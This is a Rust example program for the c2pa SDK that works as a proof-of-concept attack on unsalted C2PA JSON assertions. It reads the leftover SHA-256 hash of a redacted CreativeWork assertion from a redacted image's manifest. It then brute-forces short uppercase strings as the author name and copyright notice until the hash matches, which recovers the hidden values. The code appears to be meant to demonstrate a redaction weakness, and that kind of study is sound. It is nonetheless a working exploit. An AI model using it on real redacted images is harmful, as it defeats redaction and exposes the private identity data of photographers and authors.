// Rehash-attack proof-of-concept against an UNSALTED C2PA JSON assertion.
//
// Scenario (consumer-only threat model):
//   The attacker holds ONLY the redacted image. They cannot see the
//   original JSON content. But because the Leica M11-P firmware signed
//   `stds.schema-org.CreativeWork` *without* a salt, the SHA-256 hash
//   of its JUMBF super-box payload is still present in the parent
//   manifest (now preserved as an ingredient in the redacted file).
//
//   Given:
//     * the stored hash (pulled straight out of the parent claim's
//       hashed_uri reference),
//     * the known JSON shape,
//   the attacker brute-forces the hidden field values.
//
// Assumed JSON shape (must match byte-for-byte including key order):
//   {"@context":"http://schema.org/","@type":"CreativeWork",
//    "author":[{"@type":"Person","name":"<X>"}],
//    "copyrightNotice":"<Y>"}
//
// Usage:
//   # Extract hash from the REDACTED image and attack it.
//   cargo run --release -p c2pa --example rehash_brute_force -- \
//        sdk/examples/assets/L1000053_redacted.JPG

use std::io::Cursor;

use anyhow::{bail, Context as _, Result};
use c2pa::{calc_json_assertion_box_hash_ext, Reader};

const LABEL: &str = "stds.schema-org.CreativeWork";
const ALG: &str = "sha256";
const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const MIN_LEN: usize = 1;
const MAX_LEN: usize = 4;

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        bail!(
            "Usage:\n  \
             rehash_brute_force <redacted_image>\n  \
             rehash_brute_force --hash <target_hash_hex>"
        );
    }

    let target: Vec<u8> = if let Some(i) = args.iter().position(|a| a == "--hash") {
        let hex_str = args
            .get(i + 1)
            .ok_or_else(|| anyhow::anyhow!("--hash requires a hex value"))?;
        hex::decode(hex_str.trim_start_matches("0x"))?
    } else {
        let path = &args[1];
        extract_creative_work_hash(path)?
    };

    if target.len() != 32 {
        bail!("target hash must be 32 bytes of SHA-256 (got {})", target.len());
    }

    println!("Target hash : {}", hex::encode(&target));
    println!("Assertion   : {LABEL}");
    println!("Alphabet    : A-Z (26 symbols), lengths {MIN_LEN}..={MAX_LEN}");
    println!("Search mode : name == copyrightNotice");

    let candidates: Vec<String> = enumerate_candidates(MIN_LEN, MAX_LEN);

    let mut tried: u64 = 0;
    let start = std::time::Instant::now();


    for v in &candidates {
        tried += 1;
        if try_pair(v, v, &target)? {
            report_hit(v, v, tried, start.elapsed());
            return Ok(());
        }
    }

    println!(
        "\nNo match after {tried} candidates in {:.2?}.",
        start.elapsed()
    );
    Ok(())
}

/// Look through every manifest in the file (active + ingredients) and return
/// the hash of the first `hashed_uri` reference whose URL ends with the target
/// assertion label. In a redacted image, the assertion box itself is gone but
/// this hashed_uri entry remains in the parent claim — which is exactly what
/// makes the rehash attack possible.
fn extract_creative_work_hash(path: &str) -> Result<Vec<u8>> {
    let bytes = std::fs::read(path).with_context(|| format!("reading {path}"))?;
    let format = mime_from_path(path)?;
    let mut src = Cursor::new(bytes);
    let reader = Reader::from_stream(format, &mut src)?;

    for manifest in reader.iter_manifests() {
        for hashed_uri in manifest.assertion_references() {
            let url = hashed_uri.url();
            if url.ends_with(LABEL) || url.contains(&format!("/{LABEL}")) {
                println!("Found hashed_uri in manifest {:?}", manifest.label());
                println!("  url  : {url}");
                println!("  alg  : {:?}", hashed_uri.alg());
                return Ok(hashed_uri.hash());
            }
        }
    }

    bail!(
        "No hashed_uri for {LABEL} found in any manifest of {path}. \
         Is the file actually a redacted C2PA image?"
    )
}

fn try_pair(name: &str, copyright: &str, target: &[u8]) -> Result<bool> {
    let json = build_creative_work_json(name, copyright);
    let hash = calc_json_assertion_box_hash_ext(LABEL, &json, None, ALG)
        .map_err(|e| anyhow::anyhow!("hash error: {e}"))?;
    Ok(hash == target)
}

fn build_creative_work_json(name: &str, copyright: &str) -> String {
    // Key order and whitespace must match the signed payload byte-for-byte.
    // Leica's M11-P emits compact JSON with exactly this ordering.
    format!(
        r#"{{"@context":"http://schema.org/","@type":"CreativeWork","author":[{{"@type":"Person","name":"{name}"}}],"copyrightNotice":"{copyright}"}}"#
    )
}

fn enumerate_candidates(min_len: usize, max_len: usize) -> Vec<String> {
    let mut out = Vec::new();
    for len in min_len..=max_len {
        let mut buf = vec![0u8; len];
        enumerate_rec(&mut buf, 0, &mut out);
    }
    out
}

fn enumerate_rec(buf: &mut [u8], pos: usize, out: &mut Vec<String>) {
    if pos == buf.len() {
        out.push(String::from_utf8(buf.to_vec()).unwrap());
        return;
    }
    for &c in ALPHABET {
        buf[pos] = c;
        enumerate_rec(buf, pos + 1, out);
    }
}

fn report_hit(name: &str, copyright: &str, tried: u64, elapsed: std::time::Duration) {
    println!("\n=== MATCH ===");
    println!("name            = {name:?}");
    println!("copyrightNotice = {copyright:?}");
    println!("tried           = {tried} candidates");
    println!("elapsed         = {elapsed:.2?}");
    println!("\nRecovered JSON:");
    println!("{}", build_creative_work_json(name, copyright));
}

fn mime_from_path(path: &str) -> Result<&'static str> {
    let ext = std::path::Path::new(path)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase();
    match ext.as_str() {
        "jpg" | "jpeg" => Ok("image/jpeg"),
        "png" => Ok("image/png"),
        "gif" => Ok("image/gif"),
        "tiff" | "tif" => Ok("image/tiff"),
        "webp" => Ok("image/webp"),
        other => bail!("unsupported file extension: {other}"),
    }
}
